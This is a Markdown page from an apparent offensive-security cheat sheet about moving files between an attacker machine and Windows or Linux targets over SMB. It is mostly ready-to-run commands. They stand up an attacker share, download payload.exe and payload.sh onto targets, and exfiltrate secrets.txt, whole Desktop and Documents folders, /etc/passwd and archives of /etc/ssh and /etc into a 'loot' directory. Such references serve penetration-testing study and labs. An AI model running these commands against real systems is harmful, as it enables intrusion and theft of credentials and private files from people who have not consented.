# 03 - SMB

> [← README](../../README.md) · [Next section →](04-webdav.md)

Two-way exchange (download + upload) through an SMB share hosted on the attacker. Works well in domain networks where SMB (445) flows freely. One share covers both directions at once: the target can grab a file and upload its own.

> **Moved to other files:** WebDAV - [04-webdav.md](04-webdav.md), FTP - [05-ftp.md](05-ftp.md), SCP/SFTP - [06-scp-sftp-rsync.md](06-scp-sftp-rsync.md).

---

## Navigation

|  |  |
|---|---|
| [1.💻Attacker - stand up an SMB share (LHOST)](#1attacker---stand-up-an-smb-share-lhost) | [2.🪟Windows target ↔ Attacker (everything on RHOST)](#2windows-target--attacker-everything-on-rhost) |
| [3.🐧Linux target ↔ Attacker (everything on RHOST)](#3linux-target--attacker-everything-on-rhost) | [4. Diagnostics](#4-diagnostics) |

---

## 1.💻Attacker - stand up an SMB share (LHOST)

### Installing impacket

**With pipx (recommended):**
```bash
pipx install impacket
```

**With pip:**
```bash
pip install impacket
```

### Starting the share

**Change into the directory that will become the share contents:**
```bash
cd /tmp/share
```

**Main option - with authentication (used almost always; required for Win10+ and domain hosts where anonymous SMB is disabled):**
```bash
sudo impacket-smbserver share $(pwd) -smb2support -username test -password test
```

**Anonymous share (CTF/lab only, where anonymous access is allowed):**
```bash
sudo impacket-smbserver share $(pwd) -smb2support
```

**With authentication and an explicit path (no prior `cd`):**
```bash
sudo impacket-smbserver share /tmp/share -smb2support -username test -password test
```

**Read-only (the target can't write anything):**
```bash
sudo impacket-smbserver share $(pwd) -smb2support -username test -password test -readonly
```

**Bind to a specific LHOST IP:**
```bash
sudo impacket-smbserver share $(pwd) -smb2support -username test -password test -ip $LHOST
```

**Open port 445 in the LHOST firewall:**
```bash
sudo ufw allow 445/tcp
```

**If 445 is already taken (e.g. by local Samba):**
```bash
sudo systemctl stop smbd
```

> **Important:** the share name here is `share`; the target sees it as `\\LHOST\share\`. Everything in the share directory (`/tmp/share`) is available to the target, and anything the target uploads lands in the same place.
>
> `sudo` is needed because port **445 < 1024** (privileged). To run without root, grant the binary a capability: `sudo setcap 'cap_net_bind_service=+ep' $(which python3)`.

### Samba - when impacket isn't available
Can help when impacket throws an I/O error on kernel mount
**Install:**
```bash
sudo apt install -y samba
```

**Configure:**
```bash
sudo cp /etc/samba/smb.conf /etc/samba/smb.conf.bak
sudo mkdir -p /samba/private
sudo groupadd smbgrp
sudo useradd user1
sudo usermod -aG smbgrp user1
sudo smbpasswd -a user1
```


**Add the share to `/etc/samba/smb.conf`:**
```ini
[private]
path = /samba/private
comment = Private - full access
browsable = yes
guest ok = no
valid users = @smbgrp
read only = no
writable = yes
```

**Set permissions**
```bash
sudo chown -R user1:smbgrp /samba/private
sudo chmod 770 /samba/private
```

**Restart smbd:**
```bash
sudo systemctl restart smbd
```

---

## 2.🪟Windows target ↔ Attacker (everything on RHOST)

### Quick access

**GUI - This PC → paste the path:**
```text
\\LHOST\share\
```

**Browser - address bar:**
```text
file://///LHOST/share
```

### Download (target receives the file)

**CMD - no authentication:**
```cmd
copy \\%LHOST%\share\payload.exe C:\Users\%USERNAME%\Downloads\
```

**CMD - with authentication: `net use` first:**
```cmd
net use \\%LHOST%\share /user:test test
```

**CMD - then copy:**
```cmd
copy \\%LHOST%\share\payload.exe C:\Users\%USERNAME%\Downloads\
```

**CMD - mount as a drive and copy:**
```cmd
net use Z: \\%LHOST%\share /user:test test
```

```cmd
copy Z:\payload.exe C:\Users\Public\
```

**robocopy - more resilient than `copy`, handles folders and retries:**
```cmd
robocopy \\%LHOST%\share C:\Temp payload.exe
```
**PowerShell New-SmbMapping**
```powershell
New-SmbMapping -RemotePath "\\$LHOST\share" -UserName "test" -Password "test" | Out-Null; Copy-Item "\\$LHOST\share\from-kali.txt" "C:\Users\$env:USERNAME\Downloads\" -Force; Remove-SmbMapping -RemotePath "\\$LHOST\share" -Force
```



**PowerShell - Copy-Item:**
```powershell
Copy-Item -Path "\\$LHOST\share\flag.txt" -Destination "C:\Users\$env:USERNAME\Downloads\"
```

**PowerShell from CMD:**
```cmd
powershell -c "Copy-Item -Path '\\%LHOST%\share\payload.exe' -Destination 'C:\Users\%USERNAME%\Downloads\'"
```

### Upload (target sends the file)

**CMD - with authentication: `net use` first:**
```cmd
net use \\%LHOST%\share /user:test test
```

**CMD - a single file:**
```cmd
copy C:\Users\Public\secrets.txt \\%LHOST%\share\
```

**CMD - several files (xcopy preserves the structure):**
```cmd
xcopy C:\Users\%USERNAME%\Downloads\* \\%LHOST%\share\%COMPUTERNAME%_Downloads\ /E /I
```

**CMD - the whole desktop:**
```cmd
xcopy %USERPROFILE%\Desktop\* \\%LHOST%\share\%COMPUTERNAME%_Desktop\ /E /I
```

**CMD - all of Documents:**
```cmd
xcopy %USERPROFILE%\Documents\* \\%LHOST%\share\%COMPUTERNAME%_Documents\ /E /I
```

**robocopy - whole folders (faster and more reliable than xcopy):**
```cmd
robocopy C:\Users\Public\secrets \\%LHOST%\share\loot /E
```
**PowerShell - New-SmbMapping**
```powershell
New-SmbMapping -RemotePath "\\$LHOST\share" -UserName "test" -Password "test" | Out-Null; Copy-Item "C:\Users\Public\secrets.zip" "\\$LHOST\share\" -Force; Remove-SmbMapping -RemotePath "\\$LHOST\share" -Force
```

**PowerShell - Copy-Item:**
```powershell
Copy-Item -Path "C:\Users\Public\secrets.txt" -Destination "\\$LHOST\share\"
```

**PowerShell from CMD:**
```cmd
powershell -c "Copy-Item -Path 'C:\Users\Public\secrets.txt' -Destination '\\%LHOST%\share\'"
```

**Remove the mounted drive / all connections:**
```cmd
net use Z: /delete
```

```cmd
net use * /delete /y
```

---

## 3.🐧Linux target ↔ Attacker (everything on RHOST)

### Installation

**smbclient + cifs-utils (already in Kali):**
```bash
sudo apt install -y smbclient cifs-utils
```

### List available shares

**List shares without a password:**
```bash
smbclient -L //$LHOST -N
```

**With a username/password:**
```bash
smbclient -L //$LHOST -U test%test
```

### Download (target receives the file)

**smbclient `-N` - one-off download without mounting (anonymous):**
```bash
smbclient //$LHOST/share -N -c "get payload.exe"
```

**smbclient `-U` - same with a username/password:**
```bash
smbclient //$LHOST/share -U test%test -c "get payload.exe"
```

**Several files by mask (`mget`):**
```bash
smbclient //$LHOST/share -N -c "prompt OFF; mget *.txt"
```

**Recursively grab the entire share contents:**
```bash
smbclient //$LHOST/share -N -c "recurse ON; prompt OFF; mget *"
```

**mount cifs - work with the share like a regular folder:**
Because of impacket errors - when the host has no smbclient.
We can mount our share; this requires Samba on the LHOST host

LHOST(SAMBA SERVER)
```bash
sudo cp ~/file-transfer/payload.sh /samba/private/
```

RHOST FULL CHAIN:
```
# Make dir
sudo mkdir /mnt/mountpoint/
# Mount share
sudo mount -t cifs //10.0.2.10/private /mnt/mountpoint -o username=user1,password=1337,vers=2.0,sec=ntlmssp,nounix

# List files in attacker share
sudo ls /mnt/mountpoint/
# Copy payload to target pc
sudo cp /mnt/mountpoint/payload.sh .

# Final - unmount the share and remove the mountpoint directory.
sudo umount /mnt/mountpoint
sudo rmdir /mnt/mountpoint
```

> If `mount.cifs` returns `error(5): Input/output error` against impacket, the SMB2 options `vers=2.0,sec=ntlmssp,nounix` are required. If it still fails, use `smbclient get/put` instead.

### Upload (target sends the file)

**smbclient `-N put` - one-off upload without mounting (anonymous):**
```bash
smbclient //$LHOST/share -N -c "put /etc/passwd passwd.txt"
```

**smbclient `-U put` - same with a username/password:**
```bash
smbclient //$LHOST/share -U test%test -c "put /etc/passwd passwd.txt"
```

**Several files by mask (`mput`):**
```bash
smbclient //$LHOST/share -N -c "prompt OFF; mput *.txt"
```

**Recursively upload a directory as a tar archive:**
```bash
tar czf - /etc/ssh | smbclient //$LHOST/share -U test%test -c "put - ssh-backup.tar.gz"
```

**Create a subfolder on the share and upload there:**
```bash
smbclient //$LHOST/share -N -c "mkdir loot; cd loot; prompt OFF; mput *.zip"
```

**mount cifs - work with the share like a regular folder:**
Because of impacket errors - when the host has no smbclient.
We can mount our share; this requires Samba on the LHOST host


RHOST FULL CHAIN:
```
# Make dir
sudo mkdir /mnt/mountpoint/
# Mount share
sudo mount -t cifs //$LHOST/private /mnt/mountpoint -o username=user1,password=1337,vers=2.0,sec=ntlmssp,nounix

# List files in attacker share
sudo ls /mnt/mountpoint/

# Copy to ATTACKER SHARE
sudo cp /etc/passwd /mnt/mountpoint/
# Copy Directory (tar)
sudo tar czf /mnt/mountpoint/etc-backup.tar.gz /etc

# Final - unmount the share and remove the mountpoint directory.
sudo umount /mnt/mountpoint
sudo rmdir /mnt/mountpoint
```

LHOST:
```bash
# GET LOOT
sudo ls -la /samba/private
```

---

## 4. Diagnostics

**Port 445 is open and responding:**
```bash
nc -zv $LHOST 445
```

**List shares (Linux):**
```bash
smbclient -L //$LHOST -N
```

**List shares (Windows CMD):**
```cmd
net view \\%LHOST%
```

**Check what the target sees over the UNC path (Windows):**
```cmd
dir \\%LHOST%\share
```

> **Common pitfalls:**
>
> - **Port 445 < 1024** - start the server with `sudo` (or grant the capability `setcap 'cap_net_bind_service=+ep' $(which python3)`).
> - **445 is taken** (usually by local Samba) - `impacket-smbserver` won't start: `sudo systemctl stop smbd` or listen on another port (`-port 4455`, but keep in mind Windows UNC paths don't accept a port - you need port forwarding/a tunnel).
> - **The LHOST firewall** may block inbound 445: `sudo ufw allow 445/tcp`.
> - **Anonymous SMB** is disabled by default on Windows 10/11 and Server - start the share with `-username/-password`. On top of that, the **client** must allow the "Enable insecure guest logons" policy (`AllowInsecureGuestAuth` in the registry / Group Policy), otherwise anonymous access won't work even with the server open.
> - **`-smb2support` is mandatory** for Win10+: without it the SMB2/3 client won't connect.
> - **SMB signing**: if the target/policy requires signing, the impacket share may not work - then run Samba with a proper `smb.conf`.
> - **`net use` errors**: `1326` - wrong credentials; `1272` - access denied / blocked by policy; `53` or `67` - path/network not found (firewall, route, name resolution).

---

**See also:** [01 - Attacker → Target](01-attacker-to-target.md) · [02 - Target → Attacker](02-target-to-attacker.md) · [04 - WebDAV](04-webdav.md) · [05 - FTP](05-ftp.md) · [06 - SCP/SFTP](06-scp-sftp-rsync.md)

---

## Variable forms

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
# usage: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
:: usage: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
# usage: $LHOST
```

See the [README](../../README.md#notation-and-variables) for details.

---

[← Back to the reference](../../README.md)
